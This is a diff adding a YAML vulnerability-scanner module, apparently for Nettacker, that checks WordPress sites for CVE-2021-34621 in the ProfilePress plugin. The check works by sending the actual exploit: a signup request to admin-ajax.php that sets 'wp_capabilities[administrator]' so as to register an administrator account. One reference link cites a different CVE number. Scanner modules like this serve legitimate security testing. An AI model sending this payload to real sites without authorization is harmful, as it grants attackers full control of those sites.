@@ -1,0 +1,62 @@
+info:
+  name: wp_cve_2021_34621_vuln
+  author: Manushya
+  severity: 9.8
+  description: A significant vulnerability discovered in the user registration component of the ProfilePress WordPress plugin. This security issue, identified as CVE-2021-34621, enables unauthorized users to register on websites with administrator privileges, which could result in a full compromise of the site's security.
+  references: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-2011
+    - https://blog.securelayer7.net/easily-exploitable-critical-vulnerability-in-profilepress-plugin-of-wordpress-cve-2021-34621/
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - wordpress
+    - wp
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          content-Type: "application/x-www-form-urlencoded"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://target:{{ports}}/wp-admin/admin-ajax.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: 
+          "reg_username": "random1"
+          "reg_email": "random2@example.com"
+          "reg_password": "random3"
+          "reg_password_present": "true"
+          "reg_first_name": "random4"
+          "reg_last_name": "random5"
+          "_wp_http_referer": "/wp/?page_id=18"
+          "pp_current_url": url
+          "wp_capabilities[administrator]": "1"
+          "signup_form_id": "1"
+          "signup_referrer_page": ""
+          "action": "pp_ajax_signup"
+          "melange_id": ""
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "Registration successful."
+              reverse: false
